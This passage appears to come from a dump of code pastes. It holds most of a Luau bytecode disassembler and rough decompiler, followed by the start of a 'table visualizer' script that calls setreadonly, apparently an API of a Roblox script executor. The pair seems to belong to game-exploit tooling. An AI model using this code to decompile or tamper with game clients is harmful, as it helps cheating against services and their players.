		{ [""name""] = ""JUMPIFNOT"", [""type""] = ""iAsBx"", [""case""] = 26 },
		{ [""name""] = ""JUMPIFEQ"", [""type""] = ""iAsBx"", [""case""] = 27, [""aux""] = true },
		{ [""name""] = ""JUMPIFLE"", [""type""] = ""iAsBx"", [""case""] = 28, [""aux""] = true },
		{ [""name""] = ""JUMPIFLT"", [""type""] = ""iAsBx"", [""case""] = 29, [""aux""] = true },
		{ [""name""] = ""JUMPIFNOTEQ"", [""type""] = ""iAsBx"", [""case""] = 30, [""aux""] = true },
		{ [""name""] = ""JUMPIFNOTLE"", [""type""] = ""iAsBx"", [""case""] = 31, [""aux""] = true },
		{ [""name""] = ""JUMPIFNOTLT"", [""type""] = ""iAsBx"", [""case""] = 32, [""aux""] = true },
		{ [""name""] = ""ADD"", [""type""] = ""iABC"", [""case""] = 33 },
		{ [""name""] = ""SUB"", [""type""] = ""iABC"", [""case""] = 34 },
		{ [""name""] = ""MUL"", [""type""] = ""iABC"", [""case""] = 35 },
		{ [""name""] = ""DIV"", [""type""] = ""iABC"", [""case""] = 36 },
		{ [""name""] = ""MOD"", [""type""] = ""iABC"", [""case""] = 37 },
		{ [""name""] = ""POW"", [""type""] = ""iABC"", [""case""] = 38 },
		{ [""name""] = ""ADDK"", [""type""] = ""iABC"", [""case""] = 39 },
		{ [""name""] = ""SUBK"", [""type""] = ""iABC"", [""case""] = 40 },
		{ [""name""] = ""MULK"", [""type""] = ""iABC"", [""case""] = 41 },
		{ [""name""] = ""DIVK"", [""type""] = ""iABC"", [""case""] = 42 },
		{ [""name""] = ""MODK"", [""type""] = ""iABC"", [""case""] = 43 },
		{ [""name""] = ""POWK"", [""type""] = ""iABC"", [""case""] = 44 },
		{ [""name""] = ""AND"", [""type""] = ""iABC"", [""case""] = 45 },
		{ [""name""] = ""OR"", [""type""] = ""iABC"", [""case""] = 46 },
		{ [""name""] = ""ANDK"", [""type""] = ""iABC"", [""case""] = 47 },
		{ [""name""] = ""ORK"", [""type""] = ""iABC"", [""case""] = 48 },
		{ [""name""] = ""CONCAT"", [""type""] = ""iABC"", [""case""] = 49 },
		{ [""name""] = ""NOT"", [""type""] = ""iAB"", [""case""] = 50 },
		{ [""name""] = ""MINUS"", [""type""] = ""iAB"", [""case""] = 51 },
		{ [""name""] = ""LENGTH"", [""type""] = ""iAB"", [""case""] = 52 },
		{ [""name""] = ""NEWTABLE"", [""type""] = ""iAB"", [""case""] = 53, [""aux""] = true },
		{ [""name""] = ""DUPTABLE"", [""type""] = ""iABx"", [""case""] = 54 },
		{ [""name""] = ""SETLIST"", [""type""] = ""iABC"", [""case""] = 55, [""aux""] = true },
		{ [""name""] = ""FORNPREP"", [""type""] = ""iABx"", [""case""] = 56 },
		{ [""name""] = ""FORNLOOP"", [""type""] = ""iABx"", [""case""] = 57 },
		{ [""name""] = ""FORGLOOP"", [""type""] = ""iABx"", [""case""] = 58, [""aux""] = true },
		{ [""name""] = ""FORGPREP_INEXT"", [""type""] = ""iA"", [""case""] = 59 },
		{ [""name""] = ""DEP_FORGLOOP_INEXT"", [""type""] = ""none"", [""case""] = 60 },
		{ [""name""] = ""FORGPREP_NEXT"", [""type""] = ""iA"", [""case""] = 61 },
		{ [""name""] = ""NATIVECALL"", [""type""] = ""none"", [""case""] = 62 },
		{ [""name""] = ""GETVARARGS"", [""type""] = ""iAB"", [""case""] = 63 },
		{ [""name""] = ""DUPCLOSURE"", [""type""] = ""iABx"", [""case""] = 64 },
		{ [""name""] = ""PREPVARARGS"", [""type""] = ""iA"", [""case""] = 65 },
		{ [""name""] = ""LOADKX"", [""type""] = ""iA"", [""case""] = 66, [""aux""] = true },
		{ [""name""] = ""JUMPX"", [""type""] = ""isAx"", [""case""] = 67 },
		{ [""name""] = ""FASTCALL"", [""type""] = ""iAC"", [""case""] = 68 },
		{ [""name""] = ""COVERAGE"", [""type""] = ""isAx"", [""case""] = 69 },
		{ [""name""] = ""CAPTURE"", [""type""] = ""iAB"", [""case""] = 70 },
		{ [""name""] = ""SUBRK"", [""type""] = ""iABC"", [""case""] = 71 },
		{ [""name""] = ""DIVRK"", [""type""] = ""iABC"", [""case""] = 72 },
		{ [""name""] = ""FASTCALL1"", [""type""] = ""iABC"", [""case""] = 73 },
		{ [""name""] = ""FASTCALL2"", [""type""] = ""iABC"", [""case""] = 74, [""aux""] = true },
		{ [""name""] = ""FASTCALL2K"", [""type""] = ""iABC"", [""case""] = 75, [""aux""] = true },
		{ [""name""] = ""FORGPREP"", [""type""] = ""iABx"", [""case""] = 76 },
		{ [""name""] = ""JUMPXEQKNIL"", [""type""] = ""iABx"", [""case""] = 77, [""aux""] = true },
		{ [""name""] = ""JUMPXEQKB"", [""type""] = ""iABx"", [""case""] = 78, [""aux""] = true },
		{ [""name""] = ""JUMPXEQKN"", [""type""] = ""iABx"", [""case""] = 79, [""aux""] = true },
		{ [""name""] = ""JUMPXEQKS"", [""type""] = ""iABx"", [""case""] = 80, [""aux""] = true },
		{ [""name""] = ""IDIV"", [""type""] = ""iABC"", [""case""] = 81 },
		{ [""name""] = ""IDIVK"", [""type""] = ""iABC"", [""case""] = 82 },
		{ [""name""] = ""COUNT"", [""type""] = ""none"", [""case""] = 83 }
	};
	for _, v in pairs(optable) do
		v.number = bit32.band(v.case*caseMultiplier, 0xff)
	end
	return optable
end

local luau = {};
luau.SIZE_A = 8
luau.SIZE_C = 8
luau.SIZE_B = 8
luau.SIZE_Bx = (luau.SIZE_C + luau.SIZE_B)
luau.SIZE_OP = 8
luau.POS_OP = 0
luau.POS_A = (luau.POS_OP + luau.SIZE_OP)
luau.POS_B = (luau.POS_A + luau.SIZE_A)
luau.POS_C = (luau.POS_B + luau.SIZE_B)
luau.POS_Bx = luau.POS_B
luau.MAXARG_A = (bit32.lshift(1, luau.SIZE_A) - 1)
luau.MAXARG_B = (bit32.lshift(1, luau.SIZE_B) - 1)
luau.MAXARG_C = (bit32.lshift(1, luau.SIZE_C) - 1)
luau.MAXARG_Bx = (bit32.lshift(1, luau.SIZE_Bx) - 1)
luau.MAXARG_sBx = bit32.rshift(luau.MAXARG_Bx, 1)
luau.BITRK = bit32.lshift(1, (luau.SIZE_B - 1))
luau.MAXINDEXRK = (luau.BITRK - 1)
luau.ISK = function(x) return bit32.band(x, luau.BITRK) end
luau.INDEXK = function(x) return bit32.band(x, bit32.bnot(luau.BITRK)) end
luau.RKASK = function(x) return bit32.bor(x, luau.BITRK) end
luau.MASK1 = function(n,p) return bit32.lshift(bit32.bnot(bit32.lshift(bit32.bnot(0), n)), p) end
luau.MASK0 = function(n,p) return bit32.bnot(luau.MASK1(n, p)) end
luau.GETARG_A = function(i) return bit32.band(bit32.rshift(i, luau.POS_A), luau.MASK1(luau.SIZE_A, 0)) end
luau.GETARG_B = function(i) return bit32.band(bit32.rshift(i, luau.POS_B), luau.MASK1(luau.SIZE_B, 0)) end
luau.GETARG_C = function(i) return bit32.band(bit32.rshift(i, luau.POS_C), luau.MASK1(luau.SIZE_C, 0)) end
luau.GETARG_Bx = function(i) return bit32.band(bit32.rshift(i, luau.POS_Bx), luau.MASK1(luau.SIZE_Bx, 0)) end
luau.GETARG_sBx = function(i) local Bx = luau.GETARG_Bx(i) local sBx = Bx + 1; if Bx > 0x7FFF and Bx <= 0xFFFF then sBx = -(0xFFFF - Bx); sBx = sBx - 1; end return sBx end
luau.GETARG_sAx = function(i) return bit32.rshift(i, 8) end
luau.GET_OPCODE = function(i) return bit32.band(bit32.rshift(i, luau.POS_OP), luau.MASK1(luau.SIZE_OP, 0)) end

local function disassemble(a1, showOps)
	if type(a1) ~= ""string"" then
		error(""give string!!!"", 2)
	end

	local output = """"
	local mainProto, protoTable, stringTable = deserialize(a1)
	local luauOpTable = getluauoptable();

	local function getOpCode(opName)
		for _,v in pairs(luauOpTable) do 
			if v.name == opName then 
				return v.number;
			end
		end
		return 0;
	end

	mainProto.source = ""main""

	local function readProto(proto, depth)
		local output = """";

		local function addTabSpace(depth)
			output = output .. string.rep(""    "", depth)
		end

		-- using function name (this will be removed & done outside of readProto)
		if proto.source then
			output = output .. string.format(""function %s("", proto.source)
		else
			output = output .. ""function(""
		end

		for i = 1,proto.numParams do
			output = output .. ""arg"" .. (i - 1) -- args coincide with stack index
			if i < proto.numParams then
				output = output .. "", ""
			end
		end

		if proto.isVarArg ~= 0 then
			if proto.numParams > 0 then
				output = output .. "", ""
			end
			output = output .. ""...""
		end

		output = output .. "") "" .. ""-- line "" .. proto.lineDefined .. ""\n""

		depth = depth + 1

		for i = 1,proto.numParams do
			addTabSpace(depth);
			output = output .. string.format(""local var%i = arg%i\n"", i - 1, i - 1);
		end

		local refData = {}
		local nameCall = nil
		local markedAux = false
		local codeIndex = 1
		while codeIndex < proto.sizeCode do
			local i = proto.codeTable[codeIndex]
			local opc = luau.GET_OPCODE(i)
			local A = luau.GETARG_A(i)
			local B = luau.GETARG_B(i)
			local Bx = luau.GETARG_Bx(i)
			local C = luau.GETARG_C(i)
			local sBx = luau.GETARG_sBx(i)
			local sAx = luau.GETARG_sAx(i)
			local aux = proto.codeTable[codeIndex + 1]

			if markedAux then
				markedAux = false
			else
				addTabSpace(depth);

				local opinfo;

				for _,v in pairs(luauOpTable) do 
					if v.number == opc then 
						opinfo = v
						break;
					end
				end

				output = output .. tostring(codeIndex) .. "".   "" 

				if showOps and opinfo then
					local str = opinfo.name .. string.rep("" "", 16 - string.len(opinfo.name))

					if opinfo.type == ""iA"" then
						str = str .. string.format(""%i"", A)
					elseif opinfo.type == ""iAB"" then
						str = str .. string.format(""%i %i"", A, B)
					elseif opinfo.type == ""iAC"" then
						str = str .. string.format(""%i %i"", A, C)
					elseif opinfo.type == ""iABx"" then
						str = str .. string.format(""%i %i"", A, Bx)
					elseif opinfo.type == ""iAsBx"" then
						str = str .. string.format(""%i %i"", A, sBx)
					elseif opinfo.type == ""isBx"" then
						str = str .. string.format(""%i"", sBx)
					elseif opinfo.type == ""iABC"" then
						str = str .. string.format(""%i %i %i"", A, B, C)
					end

					if opinfo.aux then
						str = str .. "" [aux]"";
						markedAux = true
					end

					output = output .. str .. string.rep("" "", 40 - string.len(str))
				else
					if opinfo and opinfo.aux then
						markedAux = true;
					end
				end

				-- continue with disassembly (rough decompilation -- no scope/flow control)
				-- 
				local varsDefined = {};

				local function defineVar(index, name)
					table.insert(varsDefined, { [""name""] = name, [""stackIndex""] = index });
				end

				local function isVarDefined(index)
					return true;
                    --[[for _,v in pairs(varsDefined) do
                        if v.stackIndex == index then
                            return true
                        end
                    end
                    return false;
                    ]]
				end

				local function addReference(refStart, refEnd)
					for _,v in pairs(refData) do
						if v.codeIndex == refEnd then
							table.insert(v.refs, refStart);
							return;
						end
					end
					table.insert(refData, { [""codeIndex""] = refEnd, [""refs""] = { refStart } });
				end

				local nilValue = { [""type""] = ""nil"", [""value""] = ""nil"" }

				if opc == getOpCode(""LOADNIL"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = nil"", A)
				elseif opc == getOpCode(""BREAK"") then
					output = output .. ""break""
				elseif opc == getOpCode(""LOADK"") then
					local k = proto.kTable[Bx + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, (type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value))
				elseif opc == getOpCode(""LOADKX"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, (type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value))
				elseif opc == getOpCode(""LOADB"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, tostring(B == 1))
				elseif opc == getOpCode(""LOADN"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, tostring(Bx))
				elseif opc == getOpCode(""GETUPVAL"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = upvalues[%i]"", A, B)
				elseif opc == getOpCode(""SETUPVAL"") then
					output = output .. string.format(""upvalues[%i] = var%i"", B, A)
				elseif opc == getOpCode(""MOVE"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i"", A, B)
				elseif opc == getOpCode(""LENGTH"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = #var%i"", A, B)
				elseif opc == getOpCode(""MINUS"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = -var%i"", A, B)
				elseif opc == getOpCode(""NOT"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = not var%i"", A, B)
				elseif opc == getOpCode(""GETVARARGS"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = ..."", A)
				elseif opc == getOpCode(""CONCAT"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i .. var%i"", A, B, C)
				elseif opc == getOpCode(""AND"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i and var%i"", A, B, C)
				elseif opc == getOpCode(""OR"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i or var%i"", A, B, C)
				elseif opc == getOpCode(""ANDK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i and %s"", A, B, tostring(k.value))
				elseif opc == getOpCode(""ORK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i or %s"", A, B, tostring(k.value))
				elseif opc == getOpCode(""FASTCALL"") then
					output = output .. string.format(""FASTCALL[id=%i]()"", A);
				elseif opc == getOpCode(""FASTCALL1"") then
					output = output .. string.format(""FASTCALL[id=%i](%i)"", A, B);
				elseif opc == getOpCode(""FASTCALL2"") then
					output = output .. string.format(""FASTCALL[id=%i](%i, %i)"", A, B, aux);
				elseif opc == getOpCode(""FASTCALL2K"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. string.format(""FASTCALL[id=%i](%i, %i)"", A, B, tostring(k.value));
				elseif opc == getOpCode(""GETIMPORT"") then
					local indexCount = bit32.band(bit32.rshift(aux, 30), 0x3FF) -- 0x40000000 --> 1, 0x80000000 --> 2
					local cacheIndex1 = bit32.band(bit32.rshift(aux, 20), 0x3FF)
					local cacheIndex2 = bit32.band(bit32.rshift(aux, 10), 0x3FF)
					local cacheIndex3 = bit32.band(bit32.rshift(aux, 0), 0x3FF)

					if indexCount == 1 then
						local k1 = proto.kTable[cacheIndex1 + 1];

						output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, tostring(k1.value))
					elseif indexCount == 2 then
						local k1 = proto.kTable[cacheIndex1 + 1];
						local k2 = proto.kTable[cacheIndex2 + 1];

						output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s[\""%s\""]"", A, k1.value, tostring(k2.value))
					elseif indexCount == 3 then
						local k1 = proto.kTable[cacheIndex1 + 1];
						local k2 = proto.kTable[cacheIndex2 + 1];
						local k3 = proto.kTable[cacheIndex3 + 1];

						output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s[\""%s\""][\""%s\""]"", A, k1.value, tostring(k2.value), tostring(k3.value))
					else
						error(""[GETIMPORT] Too many entries"");
					end
				elseif opc == getOpCode(""GETGLOBAL"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. string.format(""var%i = %s"", A, tostring(k.value))
				elseif opc == getOpCode(""SETGLOBAL"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. string.format(""%s = var%i"", tostring(k.value), A)
				elseif opc == getOpCode(""GETTABLE"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i[var%i]"", A, B, C)
				elseif opc == getOpCode(""SETTABLE"") then
					output = output .. string.format(""var%i[var%i] = var%i"", B, C, A)
				elseif opc == getOpCode(""GETTABLEN"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i[%i]"", A, B, C - 1)
				elseif opc == getOpCode(""SETTABLEN"") then
					output = output .. string.format(""var%i[%i] = var%i"", B, C - 1, A)
				elseif opc == getOpCode(""GETTABLEKS"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i[%s]"", A, B, (type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value))
				elseif opc == getOpCode(""SETTABLEKS"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. string.format(""var%i[%s] = var%i"", B, (type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value), A)
				elseif opc == getOpCode(""NAMECALL"") then
					local k = proto.kTable[aux + 1] or nilValue;
					nameCall = string.format(""var%i:%s"", B, tostring(k.value))
					markedAux = true;
				elseif opc == getOpCode(""FORNPREP"") then
					output = output .. string.format(""FORNPREP start - [escape at #%i]"", (codeIndex + sBx) + 1);
				elseif opc == getOpCode(""FORNLOOP"") then
					output = output .. string.format(""FORNLOOP end - iterate + goto #%i"", codeIndex + sBx);
				elseif opc == getOpCode(""FORGPREP"") then
					output = output .. string.format(""FORGPREP start - [escape at #%i] -- iterator: var%i"", (codeIndex + sBx) + 1, A + 3);
				elseif opc == getOpCode(""FORGLOOP"") then
					local ipairsStyleTraversal = bit32.rshift(aux, 31) == 1
					output = output .. string.format(""FORGLOOP - iterate + goto #%i"", codeIndex + sBx) .. (ipairsStyleTraversal and "" (ipairs)"" or """");
				elseif opc == getOpCode(""FORGPREP_INEXT"") or opc == getOpCode(""DEP_FORGLOOP_INEXT"") then
					output = output .. string.format(""FORGPREP_INEXT start - [escape at #%i] -- iterator: ipairs"", (codeIndex + sBx) + 1);
				elseif opc == getOpCode(""FORGPREP_NEXT"") then
					output = output .. string.format(""FORGPREP_NEXT start - [escape at #%i] -- iterator: pairs"", (codeIndex + sBx) + 1);
				elseif opc == getOpCode(""JUMP"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i"", codeIndex + sBx);
				elseif opc == getOpCode(""JUMPBACK"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""[BACK] goto #%i -- might be a repeating loop"", codeIndex + sBx);
				elseif opc == getOpCode(""JUMPIF"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i"", codeIndex + sBx, A);
				elseif opc == getOpCode(""JUMPIFNOT"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if not var%i"", codeIndex + sBx, A);
				elseif opc == getOpCode(""JUMPX"") then
					addReference(codeIndex, codeIndex + sAx);
					output = output .. string.format(""goto #%i [X]"", codeIndex + sAx);
				elseif opc == getOpCode(""JUMPIFEQ"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i == var%i"", codeIndex + sBx, A, aux);
				elseif opc == getOpCode(""JUMPIFNOTEQ"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i ~= var%i"", codeIndex + sBx, A, aux);
				elseif opc == getOpCode(""JUMPIFLE"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i >= var%i"", codeIndex + sBx, aux, A);
				elseif opc == getOpCode(""JUMPIFNOTLE"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i < var%i"", codeIndex + sBx, aux, A);
				elseif opc == getOpCode(""JUMPIFLT"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i > var%i"", codeIndex + sBx, aux, A);
				elseif opc == getOpCode(""JUMPIFNOTLT"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i <= var%i"", codeIndex + sBx, aux, A);
				elseif opc == getOpCode(""JUMPXEQKNIL"") then
					addReference(codeIndex, codeIndex + sBx);
					local v = if bit32.rshift(aux, 31) == 1 then ""=="" else ""~=""
					output = output .. string.format(""goto #%i if var%i %s nil"", codeIndex + sBx, A, v);
				elseif opc == getOpCode(""JUMPXEQKB"") then
					addReference(codeIndex, codeIndex + sBx);
					local v = if bit32.rshift(aux, 31) == 1 then ""=="" else ""~=""
					local b = if bit32.band(aux, 1) == 1 then true else false
					output = output .. string.format(""goto #%i if var%i %s %s"", codeIndex + sBx, A, v, tostring(b));
				elseif opc == getOpCode(""JUMPXEQKN"") or opc == getOpCode(""JUMPXEQKS"") then
					addReference(codeIndex, codeIndex + sBx);
					local v = if bit32.rshift(aux, 31) == 1 then ""=="" else ""~=""
					local k = proto.kTable[bit32.band(aux, 0xFFFFFF)] or nilValue;
					output = output .. string.format(""goto #%i if var%i %s %s"", codeIndex + sBx, A, v, tostring(k.value));
				elseif opc == getOpCode(""ADD"") then
					output = output .. string.format(""var%i = var%i + var%i"", A, B, C);
				elseif opc == getOpCode(""ADDK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i + %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""SUB"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i - var%i"", A, B, C);
				elseif opc == getOpCode(""SUBK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i - %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""MUL"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i * var%i"", A, B, C);
				elseif opc == getOpCode(""MULK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i * %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""DIV"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i / var%i"", A, B, C);
				elseif opc == getOpCode(""DIVK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i / %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""MOD"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i %% var%i"", A, B, C);
				elseif opc == getOpCode(""MODK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i %% %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""POW"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i ^ var%i"", A, B, C);
				elseif opc == getOpCode(""POWK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i ^ %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""CALL"") then
					if C > 1 then
						for j = 1, C - 1 do
							output = output .. string.format(""var%i"", A + j - 1)
							if j < C - 1 then output = output .. "", "" end
						end
						output = output .. "" = ""
					elseif C == 0 then
						output = output .. string.format(""var%i, ..."", A);
						output = output .. "" = ""
					end
					if nameCall then
						output = output .. nameCall .. ""("";
					else
						output = output .. string.format(""var%i("", A)
					end
					if B > 1 then
						if nameCall then
							for j = 1, B - 2 do
								output = output .. string.format(""var%i"", A + 1 + j) -- exclude self
								if j < B - 2 then output = output .. "", "" end
							end
						else
							for j = 1, B - 1 do
								output = output .. string.format(""var%i"", A + j)
								if j < B - 1 then output = output .. "", "" end
							end
						end
					elseif B == 0 then
						output = output .. string.format(""var%i, ..."", A + 1);
					end
					nameCall = nil;
					output = output .. "")"";
				elseif opc == getOpCode(""NATIVECALL"") then
					output = output .. ""NATIVECALL()"";
				elseif opc == getOpCode(""NEWTABLE"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = {}"", A)
				elseif opc == getOpCode(""DUPTABLE"") then
					local t = proto.kTable[Bx + 1].value;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = { "", A)
					for j = 1,t.size do
						local id = t.ids[j];
						local k = proto.kTable[id];
						output = output .. ((type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value))
						if j < t.size then
							output = output .. "", "";
						end
					end
					output = output .. ""}"";
				elseif opc == getOpCode(""SETLIST"") then
					local fieldSize = aux;
					output = output .. ""\n""
					for j = 1, C do
						addTabSpace(depth);
						output = output .. string.format(""var%i[%i] = var%i\n"", A, j + fieldSize - 1, B + j - 1);
					end
				elseif opc == getOpCode(""COVERAGE"") then
					output = output .. ""COVERAGE\n""
				elseif opc == getOpCode(""CAPTURE"") then
					markedAux = true;
					local captureType = """"
					if A == 1 then
						captureType = ""UPVAL""
					elseif A == 2 then
						captureType = ""REF""
					elseif A == 3 then
						captureType = ""VAL""
					end
					output = output .. string.format(""CAPTURE %s %c%d\n"", captureType, if captureType == ""UPVAL"" then ""U"" else ""R"", B)
				elseif opc == getOpCode(""SUBRK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s - var%i"", A, tostring(k.value), B);
				elseif opc == getOpCode(""DIVRK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s / var%i"", A, tostring(k.value), B);
				elseif opc == getOpCode(""NEWCLOSURE"") then
					output = output .. ""\n""

					local nCaptures = 0;
					for j = codeIndex + 1, proto.sizeCode do
						if luau.GET_OPCODE(proto.codeTable[j]) ~= getOpCode(""CAPTURE"") then
							break
						else
							local upvalueIndex = j - codeIndex - 1;
							local captureType = luau.GETARG_A(proto.codeTable[j]);
							local captureIndex = luau.GETARG_Bx(proto.codeTable[j]);

							nCaptures = nCaptures + 1;

							addTabSpace(depth);
							if captureType == 0 or captureType == 1 then
								output = output .. string.format(""-- V nested upvalues[%i] = var%i\n"", upvalueIndex, captureIndex)
							elseif captureType == 2 then
								output = output .. string.format(""-- V nested upvalues[%i] = upvalues[%i]\n"", upvalueIndex, captureIndex)
							else
								error(""[NEWCLOSURE] Invalid capture type"");
							end
						end
					end
					codeIndex = codeIndex + nCaptures;

					addTabSpace(depth);
					local nextProto = proto.pTable[Bx + 1]
					if nextProto.source then
						output = output .. readProto(nextProto, depth)
						addTabSpace(depth);
						output = output .. string.format(""var%i = "", A) .. nextProto.source
					else
						nextProto.source = nil;
						output = output .. string.format(""var%i = "", A) .. readProto(nextProto, depth)
					end
				elseif opc == getOpCode(""DUPCLOSURE"") then
					output = output .. ""\n""

					local nCaptures = 0;
					for j = codeIndex + 1, proto.sizeCode do
						if luau.GET_OPCODE(proto.codeTable[j]) ~= getOpCode(""CAPTURE"") then
							break
						else
							local upvalueIndex = j - codeIndex - 1;
							local captureType = luau.GETARG_A(proto.codeTable[j]);
							local captureIndex = luau.GETARG_Bx(proto.codeTable[j]);

							nCaptures = nCaptures + 1;

							addTabSpace(depth);
							if captureType == 0 or captureType == 1 then
								output = output .. string.format(""-- V nested upvalues[%i] = var%i\n"", upvalueIndex, captureIndex)
							elseif captureType == 2 then
								output = output .. string.format(""-- V nested upvalues[%i] = upvalues[%i]\n"", upvalueIndex, captureIndex)
							else
								error(""[DUPCLOSURE] Invalid capture type"");
							end
						end
					end
					codeIndex = codeIndex + nCaptures;

					addTabSpace(depth);
					local nextProto = protoTable[proto.kTable[Bx + 1].value]
					if nextProto.source then
						output = output .. readProto(nextProto, depth)
						addTabSpace(depth);
						output = output .. string.format(""var%i = "", A) .. nextProto.source
					else
						nextProto.source = nil;
						output = output .. string.format(""var%i = "", A) .. readProto(nextProto, depth)
					end
				elseif opc == getOpCode(""RETURN"") then
					if B > 1 then
						output = output .. ""return "";
						for j = 1, B - 1 do
							output = output .. string.format(""var%i"", A + j)
							if j < B - 1 then output = output .. "", "" end
						end
					elseif B == 0 then
						output = output .. string.format(""var%i, ..."", A)
					end
				elseif opc == getOpCode(""IDIV"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i // var%i"", A, B, C);
				elseif opc == getOpCode(""IDIVK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i // %s"", A, B, tostring(k.value));
				end

				for _,v in pairs(refData) do
					if v.codeIndex == codeIndex then
						output = output .. "" -- referenced by ""
						for j = 1,#v.refs do
							output = output .. ""#"" .. v.refs[j]
							if j < #v.refs then
								output = output .. "", ""
							end
						end
					end
				end

				output = output .. ""\n""
			end

			codeIndex = codeIndex + 1
		end

		depth = depth - 1

		addTabSpace(depth)
		output = output .. ""end\n""
		return output;
	end

	local startDepth = 0;
	output = output .. readProto(mainProto, startDepth)

	return output
end

function deco(passedBytecode)
--[[passedBytecode = string.gsub(passedBytecode, ""\\%d+"", function(x)
	return string.char(tonumber(string.sub(x,2)))
end)]]
return disassemble(passedBytecode)
end
return deco"
qhjbQDEs,table visualizer,HTDBarsi,Lua,Sunday 18th of February 2024 03:29:14 PM CDT,"setreadonly(table,false)
local types = {
    [""nil""] = function(x) return ""nil"" end,
    [""boolean""] = function(x) return x and ""true"" or ""false"" end,
    [""number""] = function(x) return tostring(x) end,
    [""string""] = function(x) return ""\""""..x..""\"""" end,
    [""function""] = function(x) return tostring(x) end,
    [""userdata""] = function(x) if typeof(x) == ""Instance"" then return x:GetFullName() else return typeof(x).."".new(""..tostring(x).."")"" end end,
    [""thread""] = function(x) return tostring(x) end,
    [""table""] = function(x) return tostring(x) end
}

function format(x)
